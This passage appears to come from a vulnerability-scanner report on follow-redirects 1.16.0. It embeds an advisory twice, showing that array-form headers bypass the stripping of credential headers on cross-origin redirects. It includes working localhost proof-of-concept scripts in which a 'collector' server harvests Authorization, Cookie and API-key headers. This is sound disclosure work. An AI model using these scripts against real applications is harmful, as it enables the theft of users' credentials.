`this._options.headers`:\n\n- `index.js:490` - strip the credential filter (`this._headerFilter`, which covers the built-in list Authorization/Proxy-Authorization/Cookie plus any `sensitiveHeaders`) when the redirect crosses origin or downgrades protocol.\n- `index.js:470` - strip the `Host` header (`/^host$/i`).\n- `index.js:466` - strip `content-*` headers when a 301/302/303 converts POST to GET.\n\nThe caller-supplied headers container is passed straight through to each redirected request via `nativeProtocol.request(this._options)` at `index.js:352`. `_sanitizeOptions` (index.js:300-331) only replaces `options.headers` when it is falsy, so an array is left untouched.\n\nNode's `http.request` accepts `options.headers` as an alternating array of names and values (for example `[\"Authorization\", \"Bearer ...\", \"Cookie\", \"session=...\"]`). This is a supported way to control header ordering and duplication. For such an array, `for (var header in headers)` iterates the numeric indices `\"0\"`, `\"1\"`, `\"2\"`, and the header-name regex never matches any of them, so `removeMatchingHeaders` deletes nothing. Every one of the three strip operations above silently no-ops:\n\n- The built-in credential headers (Authorization, Cookie, Proxy-Authorization) are forwarded to the cross-origin redirect target.\n- Any `sensitiveHeaders` the caller declared are forwarded too.\n- The stale `Host` of the previous origin is re-sent to the new origin.\n- On a POST-to-GET redirect the `content-*` headers are retained, leaving `Content-Length` inconsistent with the now-empty body.\n\nThe primary and highest-impact consequence is disclosure of credential headers. The stale `Host` re-send and the `Content-Length` inconsistency are secondary correctness defects arising from the same root cause.\n\nRoot-cause history: the `for...in`-based `removeMatchingHeaders` used for the built-in credential strip has been present since the cross-host Authorization drop was introduced (commit `724087d`, first released in v1.11.0) and is unchanged through 1.16.0. The `sensitiveHeaders` layer was introduced in 1.16.0 (commit `844c4d3`). The behavior was verified directly on both 1.15.11 and 1.16.0.\n\nSuggested remediation: handle or explicitly reject Node's array-form headers. The strictest fix is to detect `Array.isArray(options.headers)` in `_sanitizeOptions` and throw a clear `TypeError` instructing callers to pass an object, so misuse fails loudly instead of silently downgrading security. If array support is desired, extend `removeMatchingHeaders` to walk the array in name/value pairs:\n\n```js\nfunction removeMatchingHeaders(regex, headers) {\n  if (Array.isArray(headers)) {\n    var lastValue;\n    for (var i = 0; i \u003c headers.length; i += 2) {\n      if (regex.test(headers[i])) { lastValue = headers[i + 1]; headers.splice(i, 2); i -= 2; }\n    }\n    return (lastValue === null || typeof lastValue === \"undefined\") ? undefined : String(lastValue).trim();\n  }\n  // existing object logic\n}\n```\n\nApply the same guard to the `Host` and `content-*` removal paths. Add regression tests that exercise array-form headers across a cross-origin redirect; the current suite only covers object-form headers.\n\nReferences:\n- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n- https://github.com/follow-redirects/follow-redirects/commit/724087d696c0bcd55c13ee0f3560c4558138e422\n- https://github.com/follow-redirects/follow-redirects/commit/844c4d3 (sensitiveHeaders option)\n\n### PoC\nEnvironment: Node.js v24.18.0 on Windows 11. The underlying Node array-header behavior is long-standing and not version-specific. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\nPrecondition check (Node accepts and serializes array-form headers):\n```\nnode -e 'var http=require(\"http\");var s=http.createServer((q,r)=\u003er.end(JSON.stringify(q.headers)));s.listen(0,\"127.0.0.1\",()=\u003e{var p=s.address().port;http.request({hostname:\"127.0.0.1\",port:p,headers:[\"Authorization\",\"Bearer T\",\"Cookie\",\"c=1\"]},res=\u003e{var b=\"\";res.on(\"data\",c=\u003eb+=c);res.on(\"end\",()=\u003e{console.log(JSON.parse(b).authorization, JSON.parse(b).cookie);s.close();});}).end();});'\n```\nObserved: `Bearer T c=1` (the server receives both headers, confirming array form is valid and delivered).\n\nMinimal form (built-in credential list), `arrayleak.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  req.resume();\n  res.writeHead(302, { Location: \"http://127.0.0.1:47302/steal\" });   // cross-origin (different port)\n  res.end();\n});\nvar collector = http.createServer(function (req, res) {\n  res.end(JSON.stringify(req.headers));                                // attacker-controlled target\n});\nredirector.listen(47301, \"127.0.0.1\", function () {\n  collector.listen(47302, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 47301, path: \"/\", method: \"GET\",\n      headers: [\n        \"Host\", \"127.0.0.1:47301\",\n        \"Authorization\", \"Bearer ARRAY-FORM-VICTIM-TOKEN\",\n        \"Cookie\", \"session=ARRAY-FORM-SESSION-ID\",\n        \"X-Custom\", \"harmless\"\n      ]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; });\n      res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n        console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0 and 1.15.11):\n```\nAuthorization : Bearer ARRAY-FORM-VICTIM-TOKEN     \u003c- credential LEAKED cross-origin\nCookie        : session=ARRAY-FORM-SESSION-ID      \u003c- credential LEAKED cross-origin\n```\nControl: replacing `headers` with the equivalent object `{ Host: ..., Authorization: ..., Cookie: ... }` and re-running strips both correctly, proving the strip branch executes and only the array iteration defeats it.\n\nCombined form (built-in list plus the 1.16.0 `sensitiveHeaders` fix, all defeated in one request), `combined.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  req.resume();\n  res.writeHead(302, { Location: \"http://127.0.0.1:47402/steal\" });\n  res.end();\n});\nvar collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\nredirector.listen(47401, \"127.0.0.1\", function () {\n  collector.listen(47402, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 47401, path: \"/\", method: \"GET\",\n      headers: [\n        \"Host\", \"127.0.0.1:47401\",\n        \"Authorization\", \"Bearer BUILTIN-VICTIM-TOKEN\",\n        \"Cookie\", \"session=BUILTIN-SESSION-ID\",\n        \"X-API-Key\", \"DECLARED-VICTIM-KEY\"\n      ],\n      sensitiveHeaders: [\"X-API-Key\"]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"Authorization (built-in list) :\", h.authorization || \"(stripped - OK)\");\n        console.log(\"Cookie (built-in list)        :\", h.cookie || \"(stripped - OK)\");\n        console.log(\"X-API-Key (sensitiveHeaders)  :\", h[\"x-api-key\"] || \"(stripped - OK)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0):\n```\nAuthorization (built-in list) : Bearer BUILTIN-VICTIM-TOKEN     \u003c- LEAKED\nCookie (built-in list)        : session=BUILTIN-SESSION-ID      \u003c- LEAKED\nX-API-Key (sensitiveHeaders)  : DECLARED-VICTIM-KEY             \u003c- LEAKED (the CVE-2026-40895 fix defeated)\n```\n\nProtocol-downgrade branch (credentials transit in cleartext), `downgrade.js`, using the repository's own test certificate at `test/assets/`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\"); var https = require(\"https\"); var fs = require(\"fs\");\nvar opts = { key: fs.readFileSync(\"test/assets/localhost.key\"), cert: fs.readFileSync(\"test/assets/localhost.crt\") };\nvar ca = fs.readFileSync(\"test/assets/ca.crt\");\nvar httpsOrigin = https.createServer(opts, function (req, res) {\n  req.resume(); res.writeHead(302, { Location: \"http://localhost:47502/steal\" }); res.end();\n});\nvar httpCollector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\nhttpsOrigin.listen(47501, \"localhost\", function () {\n  httpCollector.listen(47502, \"localhost\", function () {\n    followRedirects.https.request({\n      hostname: \"localhost\", port: 47501, path: \"/\", method: \"GET\", ca: ca,\n      headers: [\"Host\", \"localhost:47501\", \"Authorization\", \"Bearer DOWNGRADE-TOKEN\", \"Cookie\", \"session=DOWNGRADE-SESSION\"]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; });\n      res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n        console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n        httpsOrigin.close(); httpCollector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0): both credentials received at the plaintext HTTP target after an HTTPS-to-HTTP redirect, meaning they transit unencrypted and are harvestable by any on-path network observer, not only the redirect destination.\n\nSide-effect verification (stale Host re-sent, Content-Length inconsistent): a POST request with array-form headers and a 13-byte body that receives a 302 to a different origin was observed to arrive at the new origin as a GET carrying the stale `Host` of the first origin and `Content-Length: 13` despite an empty body.\n\n### Impact\nThis is an information-disclosure vulnerability: silent failure of the cross-origin credential-header stripping control. Who is impacted: any application, or upstream library, that calls follow-redirects with Node's array-form headers (used to control header ordering or duplication) and follows a redirect whose target is controlled or compromised by an attacker. When triggered, the victim's Authorization, Cookie, and Proxy-Authorization headers, and any headers declared through the `sensitiveHeaders` option, are disclosed to the attacker-controlled destination. In the protocol-downgrade case the credentials additionally traverse the network in cleartext, exposing them to on-path observers. No authentication or user interaction is required of the attacker beyond controlling a redirect target the victim already contacts. The control that is defeated is the same one that prior advisories in this library (CVE-2022-0155, CVE-2022-0536, CVE-2026-40895 / GHSA-r4q5-vmmm-2653) were issued to establish and harden."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-111756](https://osv.dev/CVE-2026-111756)**.\n\n## [GHSA-q3jh-wrc6-jgq8](https://osv.dev/GHSA-q3jh-wrc6-jgq8)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e follow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared `sensitiveHeaders`) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with `for...in` and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying `http.request`, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, `for...in` yields the numeric indices `\"0\"`, `\"1\"`, `\"2\"` and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The `sensitiveHeaders` option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect.\n\u003e \n\u003e ### Details\n\u003e The cross-origin credential-stripping control is implemented by `removeMatchingHeaders(regex, headers)` at `index.js:630-640`:\n\u003e \n\u003e ```js\n\u003e function removeMatchingHeaders(regex, headers) {\n\u003e   var lastValue;\n\u003e   for (var header in headers) {          // for...in over an ARRAY yields \"0\",\"1\",\"2\"...\n\u003e     if (regex.test(header)) {            // the header-name filter never matches a numeric index\n\u003e       lastValue = headers[header];\n\u003e       delete headers[header];\n\u003e     }\n\u003e   }\n\u003e   return (lastValue === null || typeof lastValue === \"undefined\") ?\n\u003e     undefined : String(lastValue).trim();\n\u003e }\n\u003e ```\n\u003e \n\u003e It is invoked from `_processResponse` for three purposes, all with the caller-supplied `this._options.headers`:\n\u003e \n\u003e - `index.js:490` - strip the credential filter (`this._headerFilter`, which covers the built-in list Authorization/Proxy-Authorization/Cookie plus any `sensitiveHeaders`) when the redirect crosses origin or downgrades protocol.\n\u003e - `index.js:470` - strip the `Host` header (`/^host$/i`).\n\u003e - `index.js:466` - strip `content-*` headers when a 301/302/303 converts POST to GET.\n\u003e \n\u003e The caller-supplied headers container is passed straight through to each redirected request via `nativeProtocol.request(this._options)` at `index.js:352`. `_sanitizeOptions` (index.js:300-331) only replaces `options.headers` when it is falsy, so an array is left untouched.\n\u003e \n\u003e Node's `http.request` accepts `options.headers` as an alternating array of names and values (for example `[\"Authorization\", \"Bearer ...\", \"Cookie\", \"session=...\"]`). This is a supported way to control header ordering and duplication. For such an array, `for (var header in headers)` iterates the numeric indices `\"0\"`, `\"1\"`, `\"2\"`, and the header-name regex never matches any of them, so `removeMatchingHeaders` deletes nothing. Every one of the three strip operations above silently no-ops:\n\u003e \n\u003e - The built-in credential headers (Authorization, Cookie, Proxy-Authorization) are forwarded to the cross-origin redirect target.\n\u003e - Any `sensitiveHeaders` the caller declared are forwarded too.\n\u003e - The stale `Host` of the previous origin is re-sent to the new origin.\n\u003e - On a POST-to-GET redirect the `content-*` headers are retained, leaving `Content-Length` inconsistent with the now-empty body.\n\u003e \n\u003e The primary and highest-impact consequence is disclosure of credential headers. The stale `Host` re-send and the `Content-Length` inconsistency are secondary correctness defects arising from the same root cause.\n\u003e \n\u003e Root-cause history: the `for...in`-based `removeMatchingHeaders` used for the built-in credential strip has been present since the cross-host Authorization drop was introduced (commit `724087d`, first released in v1.11.0) and is unchanged through 1.16.0. The `sensitiveHeaders` layer was introduced in 1.16.0 (commit `844c4d3`). The behavior was verified directly on both 1.15.11 and 1.16.0.\n\u003e \n\u003e Suggested remediation: handle or explicitly reject Node's array-form headers. The strictest fix is to detect `Array.isArray(options.headers)` in `_sanitizeOptions` and throw a clear `TypeError` instructing callers to pass an object, so misuse fails loudly instead of silently downgrading security. If array support is desired, extend `removeMatchingHeaders` to walk the array in name/value pairs:\n\u003e \n\u003e ```js\n\u003e function removeMatchingHeaders(regex, headers) {\n\u003e   if (Array.isArray(headers)) {\n\u003e     var lastValue;\n\u003e     for (var i = 0; i \u003c headers.length; i += 2) {\n\u003e       if (regex.test(headers[i])) { lastValue = headers[i + 1]; headers.splice(i, 2); i -= 2; }\n\u003e     }\n\u003e     return (lastValue === null || typeof lastValue === \"undefined\") ? undefined : String(lastValue).trim();\n\u003e   }\n\u003e   // existing object logic\n\u003e }\n\u003e ```\n\u003e \n\u003e Apply the same guard to the `Host` and `content-*` removal paths. Add regression tests that exercise array-form headers across a cross-origin redirect; the current suite only covers object-form headers.\n\u003e \n\u003e References:\n\u003e - https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n\u003e - https://github.com/follow-redirects/follow-redirects/commit/724087d696c0bcd55c13ee0f3560c4558138e422\n\u003e - https://github.com/follow-redirects/follow-redirects/commit/844c4d3 (sensitiveHeaders option)\n\u003e \n\u003e ### PoC\n\u003e Environment: Node.js v24.18.0 on Windows 11. The underlying Node array-header behavior is long-standing and not version-specific. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\u003e \n\u003e Precondition check (Node accepts and serializes array-form headers):\n\u003e ```\n\u003e node -e 'var http=require(\"http\");var s=http.createServer((q,r)=\u003er.end(JSON.stringify(q.headers)));s.listen(0,\"127.0.0.1\",()=\u003e{var p=s.address().port;http.request({hostname:\"127.0.0.1\",port:p,headers:[\"Authorization\",\"Bearer T\",\"Cookie\",\"c=1\"]},res=\u003e{var b=\"\";res.on(\"data\",c=\u003eb+=c);res.on(\"end\",()=\u003e{console.log(JSON.parse(b).authorization, JSON.parse(b).cookie);s.close();});}).end();});'\n\u003e ```\n\u003e Observed: `Bearer T c=1` (the server receives both headers, confirming array form is valid and delivered).\n\u003e \n\u003e Minimal form (built-in credential list), `arrayleak.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   req.resume();\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:47302/steal\" });   // cross-origin (different port)\n\u003e   res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) {\n\u003e   res.end(JSON.stringify(req.headers));                                // attacker-controlled target\n\u003e });\n\u003e redirector.listen(47301, \"127.0.0.1\", function () {\n\u003e   collector.listen(47302, \"127.0.0.1\", function () {\n\u003e     followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 47301, path: \"/\", method: \"GET\",\n\u003e       headers: [\n\u003e         \"Host\", \"127.0.0.1:47301\",\n\u003e         \"Authorization\", \"Bearer ARRAY-FORM-VICTIM-TOKEN\",\n\u003e         \"Cookie\", \"session=ARRAY-FORM-SESSION-ID\",\n\u003e         \"X-Custom\", \"harmless\"\n\u003e       ]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; });\n\u003e       res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n\u003e         console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0 and 1.15.11):\n\u003e ```\n\u003e Authorization : Bearer ARRAY-FORM-VICTIM-TOKEN     \u003c- credential LEAKED cross-origin\n\u003e Cookie        : session=ARRAY-FORM-SESSION-ID      \u003c- credential LEAKED cross-origin\n\u003e ```\n\u003e Control: replacing `headers` with the equivalent object `{ Host: ..., Authorization: ..., Cookie: ... }` and re-running strips both correctly, proving the strip branch executes and only the array iteration defeats it.\n\u003e \n\u003e Combined form (built-in list plus the 1.16.0 `sensitiveHeaders` fix, all defeated in one request), `combined.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   req.resume();\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:47402/steal\" });\n\u003e   res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\n\u003e redirector.listen(47401, \"127.0.0.1\", function () {\n\u003e   collector.listen(47402, \"127.0.0.1\", function () {\n\u003e     followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 47401, path: \"/\", method: \"GET\",\n\u003e       headers: [\n\u003e         \"Host\", \"127.0.0.1:47401\",\n\u003e         \"Authorization\", \"Bearer BUILTIN-VICTIM-TOKEN\",\n\u003e         \"Cookie\", \"session=BUILTIN-SESSION-ID\",\n\u003e         \"X-API-Key\", \"DECLARED-VICTIM-KEY\"\n\u003e       ],\n\u003e       sensitiveHeaders: [\"X-API-Key\"]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"Authorization (built-in list) :\", h.authorization || \"(stripped - OK)\");\n\u003e         console.log(\"Cookie (built-in list)        :\", h.cookie || \"(stripped - OK)\");\n\u003e         console.log(\"X-API-Key (sensitiveHeaders)  :\", h[\"x-api-key\"] || \"(stripped - OK)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0):\n\u003e ```\n\u003e Authorization (built-in list) : Bearer BUILTIN-VICTIM-TOKEN     \u003c- LEAKED\n\u003e Cookie (built-in list)        : session=BUILTIN-SESSION-ID      \u003c- LEAKED\n\u003e X-API-Key (sensitiveHeaders)  : DECLARED-VICTIM-KEY             \u003c- LEAKED (the CVE-2026-40895 fix defeated)\n\u003e ```\n\u003e \n\u003e Protocol-downgrade branch (credentials transit in cleartext), `downgrade.js`, using the repository's own test certificate at `test/assets/`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\"); var https = require(\"https\"); var fs = require(\"fs\");\n\u003e var opts = { key: fs.readFileSync(\"test/assets/localhost.key\"), cert: fs.readFileSync(\"test/assets/localhost.crt\") };\n\u003e var ca = fs.readFileSync(\"test/assets/ca.crt\");\n\u003e var httpsOrigin = https.createServer(opts, function (req, res) {\n\u003e   req.resume(); res.writeHead(302, { Location: \"http://localhost:47502/steal\" }); res.end();\n\u003e });\n\u003e var httpCollector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\n\u003e httpsOrigin.listen(47501, \"localhost\", function () {\n\u003e   httpCollector.listen(47502, \"localhost\", function () {\n\u003e     followRedirects.https.request({\n\u003e       hostname: \"localhost\", port: 47501, path: \"/\", method: \"GET\", ca: ca,\n\u003e       headers: [\"Host\", \"localhost:47501\", \"Authorization\", \"Bearer DOWNGRADE-TOKEN\", \"Cookie\", \"session=DOWNGRADE-SESSION\"]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; });\n\u003e       res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n\u003e         console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n\u003e         httpsOrigin.close(); httpCollector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0): both credentials received at the plaintext HTTP target after an HTTPS-to-HTTP redirect, meaning they transit unencrypted and are harvestable by any on-path network observer, not only the redirect destination.\n\u003e \n\u003e Side-effect verification (stale Host re-sent, Content-Length inconsistent): a POST request with array-form headers and a 13-byte body that receives a 302 to a different origin was observed to arrive at the new origin as a GET carrying the stale `Host` of the first origin and `Content-Length: 13` despite an empty body.\n\u003e \n\u003e ### Impact\n\u003e This is an information-disclosure vulnerability: silent failure of the cross-origin credential-header stripping control. Who is impacted: any application, or upstream library, that calls follow-redirects with Node's array-form headers (used to control header ordering or duplication) and follows a redirect whose target is controlled or compromised by an attacker. When triggered, the victim's Authorization, Cookie, and Proxy-Authorization headers, and any headers declared through the `sensitiveHeaders` option, are disclosed to the attacker-controlled destination. In the protocol-downgrade case the credentials additionally traverse the network in cleartext, exposing them to on-path observers. No authentication or user interaction is required of the attacker beyond controlling a redirect target the victim already contacts. The control that is defeated is the same one that prior advisories in this library (CVE-2022-0155, CVE-2022-0536, CVE-2026-40895 / GHSA-r4q5-vmmm-2653) were issued to establish and harden.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-q3jh-wrc6-jgq8 | follow-redirects | 1.16.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111756\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111756\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-111756](https://osv.dev/CVE-2026-111756)**.\n\n## [GHSA-q3jh-wrc6-jgq8](https://osv.dev/GHSA-q3jh-wrc6-jgq8)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e follow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared `sensitiveHeaders`) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with `for...in` and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying `http.request`, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, `for...in` yields the numeric indices `\"0\"`, `\"1\"`, `\"2\"` and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The `sensitiveHeaders` option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect.\n\u003e \n\u003e ### Details\n\u003e The cross-origin credential-stripping control is implemented by `removeMatchingHeaders(regex, headers)` at `index.js:630-640`:\n\u003e \n\u003e ```js\n\u003e function removeMatchingHeaders(regex, headers) {\n\u003e   var lastValue;\n\u003e   for (var header in headers) {          // for...in over an ARRAY yields \"0\",\"1\",\"2\"...\n\u003e     if (regex.test(header)) {            // the header-name filter never matches a numeric index\n\u003e       lastValue = headers[header];\n\u003e       delete headers[header];\n\u003e     }\n\u003e   }\n\u003e   return (lastValue === null || typeof lastValue === \"undefined\") ?\n\u003e     undefined : String(lastValue).trim();\n\u003e }\n\u003e ```\n\u003e \n\u003e It is invoked from `_processResponse` for three purposes, all with the caller-supplied `this._options.headers`:\n\u003e \n\u003e - `index.js:490` - strip the credential filter (`this._headerFilter`, which covers the built-in list Authorization/Proxy-Authorization/Cookie plus any `sensitiveHeaders`) when the redirect crosses origin or downgrades protocol.\n\u003e - `index.js:470` - strip the `Host` header (`/^host$/i`).\n\u003e - `index.js:466` - strip `content-*` headers when a 301/302/303 converts POST to GET.\n\u003e \n\u003e The caller-supplied headers container is passed straight through to each redirected request via `nativeProtocol.request(this._options)` at `index.js:352`. `_sanitizeOptions` (index.js:300-331) only replaces `options.headers` when it is falsy, so an array is left untouched.\n\u003e \n\u003e Node's `http.request` accepts `options.headers` as an alternating array of names and values (for example `[\"Authorization\", \"Bearer ...\", \"Cookie\", \"session=...\"]`). This is a supported way to control header ordering and duplication. For such an array, `for (var header in headers)` iterates the numeric indices `\"0\"`, `\"1\"`, `\"2\"`, and the header-name regex never matches any of them, so `removeMatchingHeaders` deletes nothing. Every one of the three strip operations above silently no-ops:\n\u003e \n\u003e - The built-in credential headers (Authorization, Cookie, Proxy-Authorization) are forwarded to the cross-origin redirect target.\n\u003e - Any `sensitiveHeaders` the caller declared are forwarded too.\n\u003e - The stale `Host` of the previous origin is re-sent to the new origin.\n\u003e - On a POST-to-GET redirect the `content-*` headers are retained, leaving `Content-Length` inconsistent with the now-empty body.\n\u003e \n\u003e The primary and highest-impact consequence is disclosure of credential headers. The stale `Host` re-send and the `Content-Length` inconsistency are secondary correctness defects arising from the same root cause.\n\u003e \n\u003e Root-cause history: the `for...in`-based `removeMatchingHeaders` used for the built-in credential strip has been present since the cross-host Authorization drop was introduced (commit `724087d`, first released in v1.11.0) and is unchanged through 1.16.0. The `sensitiveHeaders` layer was introduced in 1.16.0 (commit `844c4d3`). The behavior was verified directly on both 1.15.11 and 1.16.0.\n\u003e \n\u003e Suggested remediation: handle or explicitly reject Node's array-form headers. The strictest fix is to detect `Array.isArray(options.headers)` in `_sanitizeOptions` and throw a clear `TypeError` instructing callers to pass an object, so misuse fails loudly instead of silently downgrading security. If array support is desired, extend `removeMatchingHeaders` to walk the array in name/value pairs:\n\u003e \n\u003e ```js\n\u003e function removeMatchingHeaders(regex, headers) {\n\u003e   if (Array.isArray(headers)) {\n\u003e     var lastValue;\n\u003e     for (var i = 0; i \u003c headers.length; i += 2) {\n\u003e       if (regex.test(headers[i])) { lastValue = headers[i + 1]; headers.splice(i, 2); i -= 2; }\n\u003e     }\n\u003e     return (lastValue === null || typeof lastValue === \"undefined\") ? undefined : String(lastValue).trim();\n\u003e   }\n\u003e   // existing object logic\n\u003e }\n\u003e ```\n\u003e \n\u003e Apply the same guard to the `Host` and `content-*` removal paths. Add regression tests that exercise array-form headers across a cross-origin redirect; the current suite only covers object-form headers.\n\u003e \n\u003e References:\n\u003e - https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n\u003e - https://github.com/follow-redirects/follow-redirects/commit/724087d696c0bcd55c13ee0f3560c4558138e422\n\u003e - https://github.com/follow-redirects/follow-redirects/commit/844c4d3 (sensitiveHeaders option)\n\u003e \n\u003e ### PoC\n\u003e Environment: Node.js v24.18.0 on Windows 11. The underlying Node array-header behavior is long-standing and not version-specific. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\u003e \n\u003e Precondition check (Node accepts and serializes array-form headers):\n\u003e ```\n\u003e node -e 'var http=require(\"http\");var s=http.createServer((q,r)=\u003er.end(JSON.stringify(q.headers)));s.listen(0,\"127.0.0.1\",()=\u003e{var p=s.address().port;http.request({hostname:\"127.0.0.1\",port:p,headers:[\"Authorization\",\"Bearer T\",\"Cookie\",\"c=1\"]},res=\u003e{var b=\"\";res.on(\"data\",c=\u003eb+=c);res.on(\"end\",()=\u003e{console.log(JSON.parse(b).authorization, JSON.parse(b).cookie);s.close();});}).end();});'\n\u003e ```\n\u003e Observed: `Bearer T c=1` (the server receives both headers, confirming array form is valid and delivered).\n\u003e \n\u003e Minimal form (built-in credential list), `arrayleak.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   req.resume();\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:47302/steal\" });   // cross-origin (different port)\n\u003e   res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) {\n\u003e   res.end(JSON.stringify(req.headers));                                // attacker-controlled target\n\u003e });\n\u003e redirector.listen(47301, \"127.0.0.1\", function () {\n\u003e   collector.listen(47302, \"127.0.0.1\", function () {\n\u003e     